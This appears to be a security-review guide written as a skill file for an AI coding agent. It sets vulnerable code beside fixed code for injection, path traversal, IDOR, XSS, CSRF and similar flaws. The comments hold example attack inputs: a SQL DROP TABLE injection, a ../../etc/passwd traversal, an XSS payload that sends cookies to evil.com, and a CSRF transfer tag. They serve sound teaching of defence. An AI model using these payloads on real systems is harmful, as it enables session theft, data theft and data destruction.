# Security Review

AI-generated code produces the same security failures repeatedly. This skill names them so they can be found before they ship.

## The Protocol

1. Enumerate trust boundaries: what data comes from users?
2. Trace each input from entry point to sink.
3. Check each named pattern against the code.

---

## Named Patterns

### SQL Injection

User input flows into a query via string formatting instead of parameterized statements.

```python
# Vulnerable
query = f"SELECT * FROM users WHERE email = '{user_input}'"
db.execute(query)
# Input: x' OR '1'='1 returns all rows.
# Input: '; DROP TABLE users; -- destroys data.
```

```python
# Safe
db.execute("SELECT * FROM users WHERE email = ?", (user_input,))
```

Every database driver supports parameterized queries. String formatting into SQL is never acceptable.

---

### Path Traversal

User input is used in a file path without normalization. Allows reading files outside the intended directory.

```python
# Vulnerable
filename = request.args.get("file")
path = f"/app/uploads/{filename}"
return open(path).read()
# Input: ../../etc/passwd reads system files.
```

```python
# Safe
import os
filename = request.args.get("file")
base = "/app/uploads"
path = os.path.realpath(os.path.join(base, filename))
if not path.startswith(base + os.sep):
    raise ValueError("Path traversal detected")
return open(path).read()
```

---

### IDOR (Insecure Direct Object Reference)

An object is accessed by ID without verifying the requesting user owns it.

```python
# Vulnerable
order = db.get_order(request.args["order_id"])
return render_order(order)
# Any authenticated user can read any order by guessing IDs.
```

```python
# Safe
order = db.get_order(request.args["order_id"])
if order.user_id != current_user.id:
    return 403
return render_order(order)
```

IDOR is the most common access control bug in AI-generated code. Check ownership on every object retrieval.

---

### Missing Rate Limits

Authentication and sensitive endpoints accept unlimited requests. Enables credential stuffing and brute force.

```python
# Vulnerable
@app.route("/login", methods=["POST"])
def login():
    user = authenticate(request.json["email"], request.json["password"])
    # No rate limiting. 10,000 password attempts per second is possible.
```

```python
# Safe
@app.route("/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    user = authenticate(request.json["email"], request.json["password"])
```

Rate limits belong on: login, password reset, signup, OTP verification, any endpoint that sends email/SMS or burns API quota.

---

### Sensitive Data in Logs

Passwords, tokens, PII, and secrets printed to console or written to log files.

```python
# Vulnerable
logger.info(f"Login attempt: email={email}, password={password}")
logger.debug(f"Auth token: {token}")
```

```python
# Safe
logger.info(f"Login attempt: email={email}")
# Never log passwords, tokens, SSNs, credit card numbers, or health data.
```

Logging frameworks often serialize entire request objects. Confirm serializers exclude sensitive fields before shipping.

---

### XSS (Cross-Site Scripting)

User input is rendered as HTML without escaping. Allows injecting scripts that execute in the victim's browser.

```javascript
// Vulnerable
element.innerHTML = userInput;
// Input: <script>document.location='https://evil.com?c='+document.cookie</script>
// Steals session cookies from every visitor who sees this content.
```

```javascript
// Safe: use textContent for plain text, or a sanitizer for HTML
element.textContent = userInput;

// If HTML is required (rich text editors, markdown output):
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

XSS appears wherever user content is rendered: comment fields, profile names, search results, error messages. Stored XSS (content saved to DB then displayed) is more dangerous than reflected XSS (content echoed immediately). Check every place `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, or template string interpolation into HTML appears.

---

### CSRF (Cross-Site Request Forgery)

A malicious page tricks a logged-in user's browser into making authenticated requests to your server. The browser automatically includes cookies on every request, so the attacker's request looks legitimate.

```html
<!-- Attacker's page: silently transfers money when the victim visits -->
<img src="https://bank.example.com/transfer?to=attacker&amount=1000">
```

```python
# Vulnerable: state-changing endpoint has no CSRF protection
@app.route("/transfer", methods=["POST"])
def transfer():
    process_transfer(request.form["to"], request.form["amount"])
```

```python
# Safe: validate CSRF token on every state-changing request
@app.route("/transfer", methods=["POST"])
def transfer():
    validate_csrf_token(request.form["csrf_token"])
    process_transfer(request.form["to"], request.form["amount"])
```

CSRF applies to all state-changing endpoints (POST, PUT, DELETE, PATCH) that rely on cookie authentication. APIs using `Authorization: Bearer` headers are not vulnerable (browsers do not auto-send custom headers cross-origin). Modern frameworks include CSRF middleware; verify it is enabled and not bypassed for any routes.

---

### TOCTOU (Time-of-Check-Time-of-Use)

A condition is checked, then the world changes before the action executes. The action runs on stale assumptions.

```python
# Vulnerable
if user.credits > 0:
    # Another request can decrement credits here before this line executes
    user.credits -= 1
    db.save(user)
    fulfill_order(user)
```

```python
# Safe: atomic check-and-decrement
rows_updated = db.execute("""
    UPDATE users SET credits = credits - 1
    WHERE id = ? AND credits > 0
""", user.id)
if rows_updated == 0:
    raise InsufficientCreditsError()
fulfill_order(user)
```

TOCTOU appears in: balance checks before charges, inventory checks before reservations, file existence checks before writes.

---

### Dependency Vulnerabilities

Known CVEs in installed packages. Supply chain attacks are now the most common source of
real-world security incidents. Application code can be flawless while a dependency ships
a critical vulnerability.

Run the audit for your ecosystem before every release:

```bash
# Node.js / npm
npm audit
# CI-friendly version (non-zero exit on high+ severity):
npx audit-ci --high

# Python
pip-audit
# install: uv tool install pip-audit

# Rust
cargo audit
# install: cargo install cargo-audit

# Go
govulncheck ./...
# install: go install golang.org/x/vuln/cmd/govulncheck@latest
```

Reading the output: each finding shows the package, the CVE identifier, the severity
(critical/high/moderate/low), and the fixed version. Upgrade to the fixed version.

Do not dismiss a CVE as "not applicable" without confirming the vulnerable code path is
unreachable from your application. Treat any critical or high severity finding as a
hard blocker before shipping.

## Checklist

Before shipping any feature touching user input, auth, files, or databases:

- [ ] All SQL uses parameterized queries, no string formatting into queries
- [ ] All file paths are normalized and checked against a base directory
- [ ] Every object retrieval verifies ownership against the current user
- [ ] Auth and sensitive endpoints have rate limits
- [ ] No passwords, tokens, or PII appear in log statements
- [ ] Shared state mutations are atomic (no check-then-act on mutable shared state)
- [ ] User content rendered to HTML is escaped or sanitized (no raw `innerHTML`, `dangerouslySetInnerHTML`)
- [ ] State-changing endpoints validate CSRF tokens (or use header-based auth, not cookies)
- [ ] Dependency audit run (`npm audit` / `pip-audit` / `cargo audit` / `govulncheck`). No critical or high severity findings unaddressed.

---

## Artifact

After completing the checklist, write the findings to disk:

```
docs/audits/security-YYYY-MM-DD-<name>.md
```

Where `<name>` is 2-4 words in kebab-case describing the feature reviewed (e.g., `user-file-upload`, `payment-checkout-flow`). Derive it from the feature being reviewed.

Use the Write tool to create the file containing the checklist results, any flagged issues, and the patterns checked. Print the path after writing: `Saved: docs/audits/security-YYYY-MM-DD-<name>.md`

---

## Anti-Patterns

- Sanitizing input as the primary defense. Parameterization is the defense. Sanitization is a supplement.
- Checking authorization at the route level only. Ownership must be checked at the object level.
- Trusting data from your own database without re-checking permissions. The data was written in one context; the read may occur in another.
- Logging "for debugging" without removing it before shipping. Debug logs reach production.

---

## The Floor

Security is not added after features are built. Each named pattern above is an architectural decision made at implementation time. Find them in the diff before they ship. A single SQL injection in production costs more than reviewing every query in the PR.
